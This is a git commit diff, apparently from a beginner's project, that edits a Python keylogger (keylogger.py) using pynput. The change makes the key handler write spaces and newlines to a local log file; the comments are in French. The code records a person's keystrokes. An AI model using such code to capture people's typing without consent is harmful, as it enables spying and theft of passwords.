3c16437e50bdd51bea421d33486340eac78095c2
bilel233 <bilel.mjdb@gmail.com>
2024-08-07 15:37:59 +0100

    on gere la touche espace : retour a la ligne

--- keylogger.py
+++ keylogger.py
@@ -9,13 +9,13 @@ def onPush(key):
     try:
         with open("keylogger.txt", "a") as f:
             f.write(f"{key.char}")  # on gere les touches alphanumeriques
-    except AttributeError as e: # on decide de gerer les autres touches
+    except AttributeError as e:  # on decide de gerer les autres touches
         if key == keyboard.Key.space:
+            with open("keylogger.txt", "a") as f:
+                f.write(" ")  # on ecrit un espace
+        if key == keyboard.Key.enter:
             with open("keylogger.txt","a") as f:
-                f.write(" ")    # on ecrit un espace
-
-
-
+                f.write("\n")   # on ecrit dans le fichier un saut à la ligne
 
 
 if __name__ == "__main__":
